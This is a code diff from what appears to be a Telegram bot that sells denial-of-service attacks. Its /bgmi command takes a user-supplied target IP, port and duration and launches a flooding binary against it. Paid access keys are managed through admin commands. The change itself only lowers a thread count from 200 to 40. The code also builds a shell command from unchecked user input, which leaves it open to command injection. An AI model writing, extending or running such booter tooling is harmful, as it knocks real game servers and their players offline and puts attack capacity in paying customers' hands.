@@ -259,7 +259,7 @@ def handle_bgmi(message):
             record_command_logs(user_id, '/bgmi', target, port, duration)
             log_command(user_id, target, port, duration)
             start_attack_reply(message, target, port, duration)
-            full_command = f"./bgmi {target} {port} {duration} 200"
+            full_command = f"./bgmi {target} {port} {duration} 40"
             subprocess.run(full_command, shell=True)
             response = f"BGMI attack finished. Target: {target} Port: {port} Time: {duration}"
     else:
@@ -289,7 +289,7 @@ def show_command_logs(message):
 def show_admin_commands(message):
     if is_user_admin(message.chat.id, message.from_user.id):
         help_text = '''Admin commands:
-/addkey <key> <expiry_date>: Add a key with expiration date (YYYY-MM-DD).
+/addkey <key> <expiry_date>: Add a key with expiration date (YYYY-MM-DD)
 /removekey <key>: Remove a key.
 /allkeys: Authorized keys list.
 /logs: All users logs.
